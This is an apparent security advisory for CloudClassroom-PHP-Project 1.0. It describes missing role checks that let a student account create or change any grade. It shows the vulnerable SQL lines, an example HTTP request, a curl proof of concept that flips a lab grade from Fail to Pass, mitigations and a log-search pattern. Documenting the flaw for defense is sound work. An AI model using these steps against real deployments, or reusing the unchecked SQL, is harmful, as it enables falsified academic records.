# Security Advisory — Grade tampering by student (broken authorization on result)

> **Identifier:** Pending CVE assignment / Internal ID **CC-2026-26**
> **Publication Date:** 02/08/2026
> **Last Updated:** 02/08/2026
> **Severity:** High
> **CVSS:** 7.1 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N`
> **CWE:** CWE-639: Authorization Bypass Through User-Controlled Key, CWE-862: Missing Authorization
> **Status:** Unpatched

---

## 1. Executive Summary

A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the component **updateresultdetails.php, makeresult.php**, that allows **an attacker (Student account (self-registration); user interaction: None)** to exploit a **Business-logic / Broken Access Control — academic record falsification** flaw.

Grade entry/edit screens are for teachers, but — due to role segregation breakdown (item 25) — a student can create or alter any grade (e.g., Fail→Pass). No role or resource ownership verification.

Successful exploitation may result in **Student falsifies academic records: self-approval, third-party failure, grade fabrication (I:H).**

Disclosure follows responsible/coordinated policy; formal vendor notification is planned in the disclosure package (see sections 13 and 14). As of now no patch is available.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---:|---:|---|
| CloudClassroom-PHP-Project | 1.0 (and prior) | None | Affected |
| Component: updateresultdetails.php, makeresult.php | 1.0 | None | Affected |

- **Repository / Ecosystem:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
- **Evaluated Stack:** PHP + MySQLi, Apache/2.4.41 (Ubuntu), MariaDB 10.3.39

### Unaffected Products

- No other version/product evaluated in this advisory.

---

## 3. Vulnerability Description

The vulnerability occurs due to **Business-logic / Broken Access Control — academic record falsification** in the component **updateresultdetails.php**.

Grade entry/edit screens are for teachers, but — due to role segregation breakdown (item 25) — a student can create or alter any grade (e.g., Fail→Pass). No role or resource ownership verification.

**Root cause (source code snippet):**

**`updateresultdetails.php:59`**

```php
$sql="UPDATE `result` SET Marks='$tempmarks' WHERE RsID=$editid";  // any session reaches here
```

**`makeresult.php:68`**

```php
$sql="INSERT INTO `result`(`Eno`,`Ex_ID`,`Marks`) VALUES ($eno,'$ExamID','$mark')";
```

### Necessary Conditions

- Authentication: Student account (self-registration)
- User Interaction: None
- Attack Vector: Remote (network) — method GET/POST
- Preconditions: Possess any student account.

---

## 4. Impact

Exploitation may allow:

- Student falsifies academic records: self-approval, third-party failure, grade fabrication (I:H)

### Impact on Confidentiality

Low — partial/limited information exposure.

### Impact on Integrity

High — data, configuration or records can be created, altered or removed arbitrarily.

### Impact on Availability

None — no direct availability impact.

---

## 5. Classification

### CVSS

- **Score:** 7.1
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | Low (L) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | Low (L) |
| Integrity (I) | High (H) |
| Availability (A) | None (N) |

### CWE

- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-862: Missing Authorization

### CAPEC

- **CAPEC-1 – Accessing Functionality Not Properly Constrained by ACLs**

---

## 6. Exploitation Scenario

A possible exploitation scenario occurs as follows:

1. Authenticate as student (studentlogin.php).
2. Request `updateresultdetails.php?editid=<RsID>` with student cookie (read current grade).
3. Send POST `marks=Pass&update=Update!` → writes grade (teacher endpoint).
4. Verify via `viewresult.php?seno=<Eno>`. (Alternative: fabricate grade via makeresult.php.)

---

## 7. Technical Evidence

### Affected Component

```text
File(s): updateresultdetails.php, makeresult.php
Parameter(s): editid, marks, makeid
Method: GET/POST · Authentication: Student account (self-registration)
```

### Example Request

```http
POST /updateresultdetails.php HTTP/1.1
Host: 192.168.95.131:9292
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<session — dispensable via item 00 (Broken Access Control)>

editid=<value>&marks=<value>&makeid=<value>
```

### Observed Response

```text
Student session altered RsID 2378 Fail->Pass (restored in PoC). Result table intact at end.
```

### Result

Reproduced live in authorized lab (http://192.168.95.131:9292/) on 02/08/2026, in a non-destructive manner. Observed behavior confirms the Business-logic / Broken Access Control — academic record falsification flaw.

**a) Execution in browser** (real server response rendered, with evidence band):

![Web execution evidence — 26-grade-tampering](evidencia-web-26-grade-tampering.png)

**b) Vulnerable code line** (`updateresultdetails.php`):

![Source code evidence — 26-grade-tampering](evidencia-codigo-26-grade-tampering.png)

> **Note:** credentials/PII displayed belong to lab test dataset. Remove real secrets before any external publication.

---

## 8. Proof of Concept

The PoC below demonstrates only vulnerable behavior and should be used exclusively in authorized environments. Executable and non-destructive script: **`poc.sh`**.

```bash
curl -s -c stud.jar -X POST http://192.168.95.131:9292/loginlinkstudent.php \
  --data-urlencode "sid=harsh@ics.com" --data-urlencode "pass=1234"
curl -s -b stud.jar "http://192.168.95.131:9292/updateresultdetails.php?editid=2378" \
  --data-urlencode "marks=Pass" --data-urlencode "update=Update!"
```

### Expected Result

```text
Student session altered RsID 2378 Fail->Pass (restored in PoC). Result table intact at end.
```


### PoC Limitations

- Does not cause intentional unavailability.
- Does not remove or modify third-party data (state injections are restored; error-based aborts before persisting).
- Does not create persistence or backdoor.
- Does not contain real credentials (lab test data only).
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Access an instance of **CloudClassroom-PHP-Project 1.0**.
2. Configure the prerequisite: Possess any student account.
3. Access the component **updateresultdetails.php** (parameter(s): editid, marks, makeid).
4. Send the request/input described in sections 7 and 8.
5. Observe the vulnerable result: Student session altered RsID 2378 Fail->Pass (restored in PoC). Result table intact at end.
6. Compare with expected safe behavior (properly validated/sanitized/authorized input, without payload reflection or unintended execution).

---

## 10. Mitigation

Until the definitive fix is applied, recommended:

- Restrict makeresult/updateresultdetails to teachers (affirmative verification + `exit;`).
- Validate resource ownership/authorization; audit grade changes.

Additional compensatory measures:

- Restrict access to affected component (network/ACL/WAF).
- Apply WAF/reverse proxy rules to block known attack patterns.
- Review associated permissions and privileges; invalidate potentially exposed sessions/credentials.
- Maintain logs and evidence for investigation.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix available as of this advisory date (unpatched product).**

When made available, recommended:

1. Update to patched version or later.
2. Restart affected services, if necessary.
3. Invalidate old sessions and credentials.
4. Review logs prior to update.
5. Confirm vulnerable behavior can no longer be reproduced.

### Recommended Change to Vendor

- Restrict makeresult/updateresultdetails to teachers (affirmative verification + `exit;`).
- Validate resource ownership/authorization; audit grade changes.

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Access to `updateresultdetails.php` without valid session (HTTP 302 responses accompanied by full body) or by wrong role/privilege.

### Example Log Search

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "updateresultdetails.php"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 02/08/2026 | Vulnerability identified (static analysis) |
| 02/08/2026 | Confirmed dynamically in authorized lab |
| 02/08/2026 | Re-validated live with evidence (browser + code) |
| 02/08/2026 | Disclosure package prepared (this advisory) |
| (pending) | Vendor notification |
| (pending) | CVE requested/reserved |
| (pending) | Fix made available |
| (pending) | Advisory publication |

---

## 14. Vendor Communication

- **Vendor:** Vishal Mathur (`mathurvishal`)
- **Channel used:** Private GitHub Security Advisory of repository / maintainer email (see `VENDOR-EMAIL.md`)
- **Date of first notification:** (pending)
- **Response status:** Awaiting notification/response
- **Vendor positioning:** N/A at this time

---

## 15. Credits

The vulnerability was identified and reported by:

- **Researcher:** vinniboy021@gmail.com
- **Organization:** Independent security research
- **Contact:** vinniboy021@gmail.com

---

## 16. References

- https://cwe.mitre.org/
- https://www.first.org/cvss/calculator/3.1
- https://cvefeed.io/vuln/product/161371/vishalmathurcloudclassroom-php_project/
- https://github.com/mathurvishal/CloudClassroom-PHP-Project
- https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 02/08/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive and security improvement purposes.

Information presented was obtained in authorized environment and disclosed responsibly or coordinately. The author does not encourage use of this information for unauthorized access, service interruption, privacy violation or any illegal activity.

Use of information in this document is solely the reader's responsibility.

---

## 19. Contact

For corrections, updates or additional information:

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/mathurvishal/CloudClassroom-PHP-Project
